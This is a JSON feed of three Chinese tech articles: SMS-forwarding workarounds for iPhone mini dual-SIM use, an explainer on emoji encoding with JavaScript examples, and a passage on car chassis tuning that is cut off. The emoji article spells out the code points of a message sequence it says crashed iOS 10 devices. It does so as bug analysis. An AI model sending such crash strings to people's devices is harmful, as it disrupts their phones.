[{"title":"PhoneTalk 视频：低成本实现 iPhone mini「双卡双待」","date":"2022-02-15 09:26:12","description":"\n<p>本视频内容来自少数派 Matirx 作者 <a class=\"ss-atUser\" data-mention=\"@JLDUAN\" user-id=\"bs2p09db34tch278q6f0\" href=\"https://sspai.com/u/iduan\">@JLDUAN</a> ，已获取授权，文案略有删改，请大家放心观看。</p>\n<p>如果想看到更多少数派文章视频化，请大家关注 PhoneTalk 小破站账号给个一键三连。谢啦！</p>\n<p>如果需要阅读原图文版，可跳转至：</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/71054\"> </span><p>视频中 App下载地址如下：</p>\n<span class=\"ss-application\" app-id=\"16132\"> </span><span class=\"ss-application\" app-id=\"16345\"> </span><p>PhoneTalk 的 B 站视频发出后，评论区里也出现了不少好建议。比如：</p>\n<ol>\n<li>Android 手机安装钉钉和 dingtalk-sms，在钉钉建立一个群，把Android 和 iPhone 两个账号的人都拉到一个群里；Android 手机收到的所有短信都通过 dingtalk-sms 这个软件自动转发到钉钉群，iPhone 上也安装着钉钉且在同一个群里。于是就可以收到短信了，延迟极低，几乎是秒转。</li>\n<li>移动卡的话有移动官方的无忧行 App，可以托管转发电话和短信。</li>\n<li>Android 也可以用 Tasker 转发，iPhone 端用微信或其他 IM 应用都可以接收。</li>\n<li>有第二台iPhone（比如老款 SE 或者 6S），可以直接通过 iCloud 同步多台设备的短信内容。</li>\n<li><s>雇一个农民工，送他一台几百块的 Android 手机，叫他把收到的短信转发给我就行了（真·人工智能）</s></li>\n</ol>\n<p>最后，据说今年 9 月没有 iPhone 14 mini 了，这款小屏旗舰或许永远无法实现原生双卡双待，让我们且用且珍惜吧。</p>\n<p>如果你有其它好的文章选题视频化建议，欢迎在下方留言~</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注<a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，发现更多实用小技巧 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71396"},{"title":"多元、多彩还能紧跟潮流：聊聊 Emoji 的组合与创造","date":"2022-02-15 07:35:41","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>本文尝试讲解 Emoji 的一些有趣的知识，来帮助我们更好的理解这个全世界通用的语言。在开启之前，先看看你的 Emoji 考试能有几分：</p>\n<ol>\n<li>你知道不同的肤色 👍👍🏻👍🏼👍🏽 是怎么实现的吗</li>\n<li>你知道为什么早期 iOS 总会被 Emoji 的问题弄出 crash 吗</li>\n<li>你知道为什么会有两种 Emoji 吗？🅰︎ 🅰️<sup class=\"ss-footnote\" href=\"\" title=\"如果你的浏览器没有将两个 A 渲染成不同的效果，后文会解释可能的原因\" footnote-id=\"1\">1</sup>\n</li>\n</ol>\n<p>从下面开始👇🏻，为了最好的理解📖，可以打开你的浏览器🌍，跟我写点 JavaScript🧑🏻‍💻，一起看看 Emoji 的世界🚗。</p>\n<h2>定义</h2>\n<p>这里我们先统一 Emoji 的定义，到底哪些东西算 Emoji？</p>\n<ul>\n<li>iPhone 输入法里点击 😃 按钮</li>\n<li>微信、抖音的表情</li>\n<li>Telegram 在输入 Emoji 的时候，会有表情包联想。发送 Emoji 后还会有动画</li>\n</ul>\n<p>第一个场景是 Emoji 肯定是毋庸置疑的。它们虽然像图片，但是你复制粘贴后就是能随便发。</p>\n<p>而其他都不算。这里我们做一个定义：<strong>只有能被操作系统定义的编码才有可能是 Emoji。</strong></p>\n<p>怎么理解这段话？</p>\n<p>微信的表情你在输入后，当你退出到列表界面，或者尝试复制它，只能得到类似 <code>[微笑]</code> 的字符，而不是我们看到的微笑表情。所以它们本质上文本，只是微信对它做了图片替换，并保证在删除表情的时候也能直接删除 4 个字符，从而让表现上看上去就和文字类似。</p>\n<figure class=\"ss-imgRows\" figcaption=\"微信的表情其实只是文本替换图片\"><img src=\"https://cdn.sspai.com/2022/02/12/845ac86d1f7729778d71fdf42e35b548.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/12/4556ffe4462e0aa18d6ad19b84f71f99.png\" alt=\"\"></figure><p>相信你也遇见过这个场景，朋友发了一个消息，你在通知上看到的是一个 😊，你正奇怪这个朋友从来不发 emoji 的时候，点进去一看其实就是微信的 <code>[微笑]</code> 表情。这里为什么会这样呢？</p>\n<p>原因是通知中心的文字里只能是纯文本，所以微信不能对实际上是 <code>[微笑]</code> 的字符做替换，就采用了对这种字符做 Emoji 替换的方式，让其在通知中心的表现不会像有 bug。但需要吐槽的是，微信的微笑应该和 🙂 这个映射才对～</p>\n<p>Telegram 是个非常优秀的社交软件，称他是 IM 的天花板完全不为过。所以你在 Telegram 中发 Emoji 可能会得到一个它们进行定制的动画，特别有喜感。但你将 Emoji 发出去后，<strong>它被传播的形式并不是 Emoji</strong>，而是一个带有动画的图片。只不过这个图片你在复制的时候，得到的还是 Emoji 本身。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/9330eb22598df8a53ef6c34fedc35889.gif\"><figcaption>Telegram 对 Emoji 做的动画</figcaption></figure><p>综上我们看到的结论为：<strong>Emoji 就是文字</strong>，它能被复制粘贴，只是看上去是个彩色图片，也只有文字才能被编码。而文字和图片最重要的区别就是字节数量，最大的 Emoji 被编码出来后不会超过 30 个字节，而图片往往要几百字节起。那 Emoji 为普通文字的区别又是什么？</p>\n<p>Emoji 在每个操作系统里都会有一个专门的字体去定义，比如 Apple 就是 <strong>Apple Color Emoji。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/2a098f420df20e0cae6262157760c7d4\" alt=\"Image.png\"></figure><p>大家熟知的粗体，斜体等文字的风格调整往往都是由字体文件去做定义，它们描述了文字被加粗后的样子。如果字体文件缺失了这个信息的话，操作系统可能回尝试去模拟，也可能就直接忽略。所以这意味着：Emoji 无法被加粗😂</p>\n<p>我们在划定好 Emoji 的范围后才能进一步讨论，接下来先看看它的起源。</p>\n<h2>起源</h2>\n<p><strong>E</strong>(え)<strong>mo</strong>(も)<strong>ji</strong>(じ)—絵文字，其中 <strong>e</strong> 是 绘，<strong>moji</strong> 代表文字的意思，最早起源于日本的 20 世纪 90 年代，由软银推出。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/f33cc4f605630b4b20567c20f5b63488\" alt=\"softbank-1997-emoji-set-apple-comparison-emojipedia.jpeg\"></figure><p>接着的事情大家都知道了，iPhone 面世，为了占领日本市场（我有一亿人需要用 Emoji 呢），就合作将其弄了进去。并随着 iPhone 的热度提升，Emoji 也开始世界范围内大火 。接着 Emoji 被纳入 Unicode，大部分 Emoji 都有了自己的码位，成为一个事实上的标准。这样消费者也不用担心 iPhone 手机发的 Emoji 安卓看不到了。</p>\n<p>但在当时那个年代，大部分手机屏幕并不是彩色的，所以一开始很多 Emoji 其实是这个样子的：</p>\n<p>🅰︎🅱︎，它们和 🅰️🅱️ 又有什么区别？</p>\n<blockquote><p>NOTE：在实际测试的时候我发现少数派在展示这种 Emoji 的时候，在 Safari 和 Chrome 上表现也有差别，可能会有展示问题。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/69cd09bab46e008406eaec3c338fad69.png\"></figure><p>我们以 🅰︎ 为例子。在最开始的时候，🅰︎ 的 Unicode 编码应该是 1f170<i>。</i>但之后屏幕开始变成彩色，于是定义一套彩色的字符开始有必要。但直接将文字形式的 Emoji 替换成彩色形式可能会对之前的表达带来误解，所以为了兼容这种旧形式，采取了一种比较「奇怪」的方式来获得图片形式——Variation Selector。</p>\n<p>Unicode 中定义了很多不同版本的 Variation Selector，我们只要记住对应 Text 的版本是 15，对应 Emoji 的版本是 <a href=\"https://emojipedia.org/variation-selector-16/\">16</a>，后文将分别简写为 VS-15(0xfe0e)，VS-16(0xfe0f)。于是🅰︎和🅰️的实际编码分别是 0x1f170 0xfe0e 和 0x1f170 0xfe0f。</p>\n<p>如果你感兴趣的话，可以打开浏览器的控制台，输入看看效果。</p>\n<pre class=\"language-javascript\"><code>String.fromCodePoint(0x1f170, 0xfe0e)\nString.fromCodePoint(0x1f171, 0xfe0f)</code></pre>\n<p>所以后续的 Emoji 输入法中，都会刻意添加 VS 来做区分。但之前这些没加的文本应该怎么处理？</p>\n<p>Unicode 建议针对这些没有 VS 符号的字符，采用 VS-15 作为默认，意味着 1f170 应该渲染成文字形式。但是 Apple 可能是为了秀自己的 Emoji 字体，并没有遵守这个标准。所以在不同平台上会有不同效果，比如这个 🈹️</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/deae3ef67cc2d73ff1502eddf1f8b25a\" alt=\"Image.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/4f37585890d74993cb97591a46e78906\" alt=\"Image.png\"></figure><p>如果你用过飞书的话，可能就体验过系统输入法给你的建议是图片形式的 Emoji，但是发送出去后就变成文本模式了。就是因为输入法建议的 Emoji 丢了 VS，所以两边的软件具有不同的解释方式</p>\n<h2>旗帜问题</h2>\n<p>接着根据这个 VS-16，让我们来看看 iOS 10 时期出现的一个 <a href=\"https://www.instapaper.com/read/1288315176\">bug</a>：</p>\n<blockquote><p>简单点讲就是一旦收到某人发送过来的含有”🏳️‍0🌈”的短消息，将会导致设备死机，需要重启手机才能解决。</p></blockquote>\n<p>想要解释清楚这个 bug，先要了解一下旗帜的规则。</p>\n<p>我们先记住一个原则，Unicode 非常抠门，为了节省码位它们什么事情都干得出来。你想想，世界上，那么多国家。国家内部可能还有一些地区，这些地区也有自己的旗帜。如果一个个编码显得过于奢侈和复杂。举个例子，假设 Unicode 先给国旗放 500 个码位，然后现有国家用掉了 300 个。未来又有一些奇怪的旗帜也想进去凑数，但这样可能导致剩下的 200 个也不够放，那又需要临时开一个区域放新的码位。针对这个问题，Unicode 也提出了一种解决方案，对气质做了分类</p>\n<ol>\n<li>最简单的旗帜：🚩🏳️🏁🏴🎌。这些旗帜都有独立的码位，不过为了兼容早期，可能会跟着一个 VS-16。</li>\n<li>国旗—🇨🇳🇺🇸🇬🇧。</li>\n<li>地区旗帜—🏴󠁧󠁢󠁥󠁮󠁧󠁿🏴󠁧󠁢󠁳󠁣󠁴󠁿。</li>\n<li>特殊旗帜—🏳️‍🌈🏴‍☠️</li>\n</ol>\n<h3>国旗</h3>\n<p>它们是由专门的 <a href=\"https://en.wikipedia.org/wiki/Regional_Indicator_Symbol\">Regional Indicator Symbol(RIS)</a> 组合而来，从 A 到 Z，码位分别是从 1f1e6 到 1f200，光是两两组合就有 26 * 26 中方案。打开控制台输入</p>\n<pre class=\"language-javascript\"><code>Array.from({ length: 26 }, (_, i) =&gt; String.fromCodePoint(0x1f1e6 + i)).join(',')</code></pre>\n<p>就能看到所有的字符。为什么要用 <code>join(',')</code> 而不是 <code>join('')</code>？试试看😏</p>\n<p>所以🇨🇳就是 🇨 🇳 放在一起，同样的🇺🇸的就是 🇺 🇸。</p>\n<p>如果你对这种两个字符放在一起，会变成新的字符的特性不是很熟悉的话，可能会认为这是 Emoji 的特性，但其实这种被称为 <a href=\"https://en.wikipedia.org/wiki/Combining_character\">Combining Character</a> 的技术很早就已经被支持。</p>\n<p>最常见的使用场景就是拉丁语和音调符号的组合。比如 é 有一个单独的码位 e9，但是它也可以由 e 和 ´ 组合，它们的码位分别是 65 和 301。所以如果你在浏览器输入 <code>'\\u{65}\\u{301}'</code> 也能得到 é。但是像 JS 这种相对落后的语言并不会认为 <code>'\\u{65}\\u{301} === \\u{e9}'</code> 是 <code>true</code>，反观 Swift 这种相对现代的语言，则对这个特性有了良好的支持。</p>\n<h3>地区旗帜</h3>\n<p>我不太懂政治，不太清楚像英格兰和苏格兰这两个地方不是国家（世界杯都是两支队伍），但是它们都有自己的旗帜。这里的组合逻辑就很复杂了，首先需要一个 🏴 跟上 ISO 定义的 RIS，再跟上一个 Cancel Tag(007f)*。像这里英格兰的 RIS 是 *GBENG，可能是 Great Britain EnGLand 的缩写。换句话说，一个🏴󠁧󠁢󠁥󠁮󠁧󠁿就占了 7 个码位，比直接写「英格兰」浪费多了🌚</p>\n<h3>彩虹旗</h3>\n<p>这些旗帜本质上是通过 Emoji 组合起来的。比如彩虹旗就是 🏳️+ZWJ+🌈，🏴‍☠️是🏴+ZWJ+☠️。<a href=\"https://emojipedia.org/zero-width-joiner/\">ZWJ（Zero Width Joiner)</a> 可以理解成 Emoji 胶水，用来粘合一些用于特殊意义的 Emoji，以达到节省码位的目的，它们被称之为 <a href=\"https://blog.emojipedia.org/emoji-zwj-sequences-three-letters-many-possibilities/\">Emoji ZWJ Sequence</a>，毕竟谁能知道 10 年后，我们手机里有多少个 Emoji 呢？插一句题外话，当你发现项目中 <code>if (result == '')</code> 分支怎么都不为真的时候，可能就是有人在代码里下毒了。</p>\n<p>所以，回到我们上面提到 iOS 10 曾经的一个 bug，表面上是🏳️0🌈这种组合，如果直接输入这个几个符号并不会有什么问题，因为它们的对应的编码是 <i>1f3f3, fe0f, 30, 1f308</i>。而会让机器的 Crash 的信息对应的编码 1f3f3, fe0f, 200d, 30, 1f308—<strong>其中多出来的 </strong><i><strong>200d</strong></i><strong> 就是 ZWJ</strong>。所以说，造成这个漏洞的原因可能是：1f3f3, f30f, 200d 同时出现后，系统预期 200d 后面的字符可以组合一个新的 Emoji。但是通过人为添加的 0，过于想当然的系统就 Crash 了。</p>\n<p>接着我们继续展开 ZWJ，看看有哪些 Emoji 是基于这个来创造的。</p>\n<h2>Emoji ZWJ Sequence</h2>\n<p>这个的使用场景除了上面提到的物体之间的组合之外，更多的还是人之间的组合。比如👨和特殊的物品组合在一起，变成了某个专业人士。👨和👩组合在一起，👨👩🧒在一起，👨👨 在一起，都能组合家庭。还有一些虚幻的人物，比如🧚‍♀️，🧟‍♀️这些，从 Emoji 12 开始，出于政治正确的目的，都将这些虚幻人物默认设置为「中性」，并通过 ZWJ 拼接 ♂️和 ♁️。最让我觉得有趣的还是爱情相关的符号：👩‍❤️‍💋‍👩 👩‍❤️‍👨。</p>\n<p>下面我们来详细讨论这些</p>\n<h3>专业人员</h3>\n<p>👩‍🎤👩‍🏫👩‍🔧👩‍🎓，这四个 Emoji 对应的分别是女歌手、女教师、白皮肤的女技师、女大学生。根据 Emoji 的规则就是：</p>\n<p>👩‍🎤：👩 + ZWJ + 🎤</p>\n<p>👩‍🏫：👩 + ZWJ + 🏫</p>\n<p>👩‍🔧：👩 + ZWJ + 🔧</p>\n<p>👩‍🎓：👩 + ZWJ + 🎓</p>\n<p>注意到基本公式就是 性别 Emoji + ZWJ + 一个能表示该专业人员的典型物体。虽然在学校的女人不一定仅仅是老师，还可能是家长、学生，但是一个老师由「女人+ 学校」组成我们很容易记忆。</p>\n<p>其实通过这个规律我们可以看到很有意思的效果——</p>\n<pre class=\"language-javascript\"><code>'👩' + '\\u200d' + '🎤' // 👩‍🎤\n'👩‍🎤'.replace('🎤', '🎓') // 👩‍🎓</code></pre>\n<p>引用 Twitter 上的一幅图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/ea5ef98016d935d036ddb501011b1a5d\" alt=\"Photo Apr 16, 2020 at 104117 PM.jpeg\"></figure><h3>虚构人物</h3>\n<p>我尝试尽量列出所有虚拟人物：</p>\n<ul>\n<li>超级英雄：🦸🦸‍♂️🦸‍♀️</li>\n<li>超级反派：🦹🦹‍♂️🦹‍♀️</li>\n<li>法师：🧙🧙‍♂️🧙‍♀️</li>\n<li>仙子：🧚 🧚‍♂️🧚‍♀️</li>\n<li>吸血鬼：🧛🧛‍♂️🧛‍♀️</li>\n<li>人鱼：🧜🧜‍♂️🧜‍♀️</li>\n<li>精灵：🧝🧝‍♂️🧝‍♀️</li>\n<li>妖怪：🧞🧞‍♂️🧞‍♀️</li>\n<li>僵尸：🧟🧟‍♂️🧟‍♀️</li>\n</ul>\n<p>这些虚拟人物的 Emoji 饱含了深深的政治正确。首先，任何角色都有一个男性，也有一个女性在里面，特别是美人鱼还有男性这个完全忍不了，甚至在 iOS 15.4 中还有怀孕的男性 Emoji 出现 :)</p>\n<p>但是呢，Emoji 标准还更进一步，它们又多了一个没有性别的符号，这样的改动看上去似乎是因为近几年平权运动的兴起，所以多了一个符号。</p>\n<p>但是 Emoji 的组合公式也变了，相比之前女性角色是由 男性角色加上 ♂️ 符号，这种过于男权的表现。<strong>现在改为一个没有性别的 Emoji + ZWJ + ♂️或者 ♀️ 表示对应的性别组合。</strong></p>\n<pre class=\"language-javascript\"><code>[...'🧜‍♂️'].map(a =&gt; a.codePointAt(0).toString(16))\n// [\"1f9dc\", \"200d\", \"2642\", \"fe0f\"] (4)</code></pre>\n<h3>爱情</h3>\n<p>一开始对爱情的定义应该挺容易的：💑，男性和女性之间出现了个❤️。公式为 👨 + ZWJ + ❤️ + ZWJ + 👩。秉承着包容的态度，Emoji 也对爱情的定义进行了扩容—👨‍❤️‍👨👩‍❤️‍👩</p>\n<p>有了爱情的下一步就是 kiss，所以 👨‍❤️‍💋‍👨 👩‍❤️‍💋‍👩 也自然少不了。Kiss 相比爱情的 Emoji，是在❤️ 后面接个ZWJ 和 💋‍‍‍——Interesting。</p>\n<p>有了爱情之后，自然就会组成家庭👪</p>\n<h3>Family</h3>\n<p>家庭最开始也挺简单的，爸爸👨和妈妈👩加上几个孩子的组合。一个👦，一个👧，一👦一👧，两个👧，两个👦，就五种——👨‍👩‍👦 👨‍👩‍👧 👨‍👩‍👧‍👦 👨‍👩‍👦‍👦 👨‍👩‍👧‍👧 。</p>\n<p>公式为 👨 + ZWJ + 👩 + ZWJ + 👧 + ZWJ + 👦，你可以很容易验证。</p>\n<p><code>[...'👨👩👧👦'].join('\\u{200d}')</code></p>\n<p>但是不知道从什么时候开始，家庭的概念也被扩充了。有单亲家庭，有同性家庭：👨‍👨‍👧‍👦👩‍👩‍👦‍👦👨‍👧。不过公式相比早期的家庭，仅仅是将 👨 👩 删去一个，或者换成两个同样 Emoji，比如 <code>[...'👨👧👦'].join('\\u{200d}')</code>。</p>\n<p>当然，少不了无性别的符号：👪</p>\n<h3>非标准</h3>\n<p>比如微软对 🐈 的拓展，🐱‍👤 🐱‍💻。这些符号应该只能在 Windows 系统上看到效果，它们的样子类似于图片所示</p>\n<figure class=\"ss-imgRows\" figcaption=\"忍者猫和程序猫\"><img src=\"https://cdn.sspai.com/2022/02/12/c5403deff88ad595f0ee2f791a4bb439.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/12/d862c988656964cc9456de27d59fca59.png\" alt=\"\"></figure><p> </p>\n<h2>皮肤和发型</h2>\n<p>我们现在已经知道 Emoji 是如何通过组合不同的字符来得到新的 Emoji，而这里的魔力就是 ZWJ。上面提到的规则就涵盖了我们在 Emoji 键盘中绝大多数 Emoji 的组成规则。接着，我们再来看看长按 Emoji 键盘的表现。图片中我以一个卷发男人的 Emoji 为例，长按后可以得到另外的 5 种颜色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/12/article/3608592f74eaaaea116c25f6b485132b\" alt=\"IMG_2217.jpeg\"></figure><p>我记得在几年前，iOS 刚刚支持展示这些皮肤的时候，大家认为默认的颜色代表了「黄种人」，有点点自豪感，但是似乎又过于黄了—这些老外是不是没看过我们亚洲人啊？之所以将基准颜色设计成这种黄色，仅仅是因为世界上没有任何人长这样。而 Emoji 中的部分颜色已经具有含义了，比如绿色的代表了中毒🤢，红色代表了中暑🥵，蓝色代表冷死🥶，所以黄色显然是一个挺不错的选择。</p>\n<p>这五种颜色又是基于什么来判定的？有一种 <a href=\"https://en.wikipedia.org/wiki/Fitzpatrick_scale\">Fitzpatrick(菲茨帕特里克) Scale</a> 分类法，就被 Emoji 皮肤系统采用，虽然最初是为了评估不同肤色的人对紫外线的反应程度。只不过相比 Fitzpatrick Scale 的 6 种的分类，Emoji 仅仅引入了 5 种，它将第一种和第二种合并了，因为这样会看上去更真实。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/c69fe6c8d17c1679bddb15897e9528ef\" alt=\"640px-Influence_of_pigmentation_on_skin_cancer_risk.png\"></figure><p>所以在 Emoji 中表示颜色的方式就是人物或者人物器官，加上肤色的 Emoji。它们分别是</p>\n<p>🏻 🏼 🏽 🏾 🏿，码位对应：1f3fb, 1f3fc, 1f3fd, 1f3fe, 1f3ff。</p>\n<p>需要强调的是，肤色和下面将要提到的发型，在和支持的 Emoji 组合在一起的时候，是不需要 ZWJ 的，所以 💪 + 🏻 就是 💪🏻。</p>\n<p>可能是工作量的问题，家庭，爱情这些 Emoji 还没有来得及支持肤色。反而是👫的 Emoji 最先支持了多种肤色的排列组合。</p>\n<p>接着，除了皮肤之外，还有发型。红发 🦰卷发🦱 秃头🦲以及白发🦳，它们的码位分别是 1f9b0, 1f9b1, 1f9b2, 1f9b3。我不太清楚为什么会选用这四种发型。</p>\n<p>和皮肤一样，满足公式的 Emoji 并排放在一起就能看到组合成新的的 Emoji —白发的女性 👩‍🦳。因为皮肤和发型并不能直接通过 Emoji 键盘获得，所以如果需要的话，可以通过运行下面的代码：</p>\n<pre class=\"language-javascript\"><code>Array.from({ length: 5 }, (_, i) =&gt; String.fromCodePoint(i + 0x1f3fb))\nArray.from({ length: 4 }, (_, i) =&gt; String.fromCodePoint(i + 0x1f9b0))</code></pre>\n<h2>总结</h2>\n<p>相信看到这里，大家应该已经了解了 Emoji 的相关原理，也能对有些时候编辑 Emoji 的一些怪异行为坦然以对。比如下面肤色的符号： 🏻，看上去👈有一个多出来的空格，但其实你就是删不掉 😊</p>\n<p>如果又因为新的 bug 导致了 iOS 崩溃也不要嘲笑，因为这真的很难 :)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/b003b2a3e33cbcc785f23ae6a0706370\" alt=\"CleanShot 2022-02-12 at 14.38.21.gif\"><figcaption>在 Safari 上，英格兰要删好多次才能删除干净</figcaption></figure><h2>参考资料</h2>\n<ul>\n<li><a href=\"https://character.construction/emoji-vs-text\">Emoji vs. Text Presentation character construction</a></li>\n<li><a href=\"https://blog.emojipedia.org/emoji-flags-explained/\">Emoji Flags Explained</a></li>\n<li><a href=\"https://emojipedia.org/subdivision-flags/\">Subdivision Flags</a></li>\n<li><a href=\"http://preston159.com/bug.html\">Reckless Rainbow Bug</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/71398"},{"title":"底盘调校究竟调的是什么？","date":"2022-02-15 07:00:13","description":"\n<p data-pid=\"ACfGfxg0\"><b>有人说“底盘调校是对汽车底盘工程师的灵魂之问！”</b></p>\n<p data-pid=\"L028fbzV\">底盘调校是什么？为什么车企会不惜重金聘请外国专家进行底盘调校？奔驰偏向舒适，宝马偏向运动，而奥迪则是两者取乎其中，是调出来的吗？</p>\n<p data-pid=\"cPLQF75t\">下面让我们抽丝剥茧，看看什么是底盘调校？</p>\n<p data-pid=\"jpmx8aRI\">发动机被人们比作汽车的心脏，底盘就可看作是汽车的骨骼，它涉及动力传动系统、行驶系统（主要包括车架、悬架、车轮）、转向系统和制动系统，底盘技术的好坏直接影响到汽车安全性、操控性、舒适性等，可谓牵一发而动全身。</p>\n<p data-pid=\"TeXJaVtS\"><b><i>一、什么是底盘调校 </i></b></p>\n<p data-pid=\"4QZ1zapz\">汽车底盘性能如<b>木桶效应</b>：没有经过调校的样车存在各种各样的短板，例如：过弯侧倾大、不足转向度大、弯道抓地力不足、制动点头大及冲击舒适度差等问题，无法让用户满意。底盘调校过程是补齐或平衡各项性能，增大性能“<b>存水量</b>”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e6db958526a22542d4a463844c580ba9_720w.jpeg?rss\" data-caption=\"著名的km77麋鹿测试\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"400\" data-watermark=\"watermark\" data-original-src=\"v2-e6db958526a22542d4a463844c580ba9\" data-watermark-src=\"v2-d669afa15e4bc119313f970e01508027\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"dvHUQfbF\"><b>汽车要拥有优秀的底盘性能取决于前期基础结构设计、后期底盘调校工作和生产一致性控制三个方面</b>。其中，基础结构设计性能贡献占比约为60%，底盘调校约为30%，生产一致性控制占比约为10%。即基础结构设计是底盘性能达标的前提，底盘调校是性能再拔高的过程，生产一致性控制是底盘性能的最终保障。</p>\n<p data-pid=\"F-iElkIK\">底盘调校是在有限的成本和资源条件下，整合各个子系统和零部件，协调各种矛盾，通过调校的手段找到各方面性能的最佳平衡点，以满足既定的性能开发目标。</p>\n<p data-pid=\"eo4b12XN\"><i><b>二、底盘调校主要方法</b> </i></p>\n<p data-pid=\"kLoyvKmJ\">一直以来各汽车企业把底盘调校作为看家本领，其技术的复杂性及难度在整车性能开发过程中不言而喻。汽车性能一般用动力性、燃油经济性、制动性、操纵稳定性、平顺性和通过性等评价指标来评价，整车调校主要围绕这些指标开展相应的工作。一般提到的底盘调校更多的是指在底盘性能调校过程中，如何提升底盘整体性能并保证舒适性和操控性的最佳平衡。</p>\n<p data-pid=\"aX8HP0x6\">汽车要具有良好的转向性能、操纵稳定性以及行驶舒适性，一方面在设计时要优化车辆整体架构，使之具有好的K&amp;C性能，涉及到悬架系统的硬点、转向特性、车轮定位参数等设计。另一方面涉及到弹簧、稳定杆、减振器、轮胎衬套、转向系统等零部件及系统的开发与匹配。</p>\n<p data-pid=\"mHs6gPMy\">汽车底盘性能调校方法包括虚拟调校法和主观调校法。其中，虚拟调校法成本低、效率高，主观调校法为以人的感官来最终确认产品的感知品质。</p>\n<ol><li data-pid=\"_oQBs2MP\">\n<b>主观调校法  </b>主观评价在欧美、日本等汽车发达国家已非常成熟，国内汽车性能主观评价体系尚在不断完善中。主观评价包括转向性能、操稳性能、舒适性能等方面的评价。如操纵稳定性的主观评价指标包括转向反馈、行驶稳定性、制动稳定性、驾驶信心、弯道行驶动力变化、瞬态转向、稳态转向、试验场道路行驶舒适性、公共道路行驶舒适性等一级评价指标。影响这些指标的关键在于整车的动力学特性以及系统和零部件的性能参数，在调校过程中可根据评价指标来重点解决动力学特性问题以及优化系统和零部件的性能参数，最终使车辆的操纵稳定性达标。</li></ol>\n<p data-pid=\"rdtYJf-s\">通常主观评价评分体系将性能等价分为10级，最好得10分，最差为0分，评分以蝴蝶图的方式呈现。图2为某车型调校前主观评价结果、竞标车评价结果以及该车型期望达到的目标值。 最终目标是缩小该车型与竞标车的差距， 并在完成调校后使得该车型的主观评价评分不低于目标值。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e0a909aab65348c63eb7bc9ff51193b6_720w.png?rss\" data-caption=\"图2 某车型与竞标车型评价结果及目标设定值\" data-size=\"normal\" data-rawwidth=\"1282\" data-rawheight=\"1022\" data-watermark=\"watermark\" data-original-src=\"v2-e0a909aab65348c63eb7bc9ff51193b6\" data-watermark-src=\"v2-5a666ff35d70cf8d0ada960207e9b67e\" data-private-watermark-src=\"\"></p>\n<ol><li data-pid=\"0-xpw7jb\">\n<b>虚拟调校法 </b>主观评价法存在难以量化的局限性，汽车企业会采用一些商业软件对整车进行虚拟样机建模并完成模型标定，展开调校结果的定性验证。常用的软件有多刚体动力学软件Adams/ car、carsim等。仿真验证是根据国家标准进行，如《GB/T4970-2009 汽车平顺性试验方法》、《GB∕T 6323-2014 汽车操纵稳定性试验方法》等标准。底盘调校中重要研究对象是悬架，悬架的K&amp;C 性能是不能不知的概念。</li></ol>\n<p data-pid=\"4jlPrKDT\"><b>K&amp;C 性能：</b>K代表英文 Kinematic， 即不考虑力和质量的运动，而只跟悬架连杆有关的车轮运动； C代表英文Compliance，也就是由于施加力导致的变形，跟悬架系统的弹簧、橡胶衬套以及零部件的变形有关的车轮运动。</p>\n<p data-pid=\"j03XFTOW\">悬架系统K&amp;C试验就是在台架上模拟道路激励导致的悬架运动。近年来，随着计算机仿真技术的发展，运用软件对悬架系统K&amp;C特性进行仿真的结果已经能够较好地和试验结果相吻合。K&amp;C特性研究可在整车前期开发阶段进行悬架系统的架构；在虚拟评审阶段验证悬架和整车动力学仿真模型；在逆向设计和对比车型的研究中，进行竞争车型调查研究；在样车试制的各个不同阶段，支持底盘调试工作。</p>\n<p><br></p>\n<p data-pid=\"bbyBN-Nj\"><b><i>三、底盘调校流程</i></b></p>\n<p data-pid=\"aaINnpEr\">国内各主机厂底盘调校流程大同小异，如图3所示。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8531e67274378866bfd07a6a04178158_720w.jpg?rss\" data-caption=\"图3 底盘调教流程示意图\" data-size=\"normal\" data-rawwidth=\"277\" data-rawheight=\"408\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p 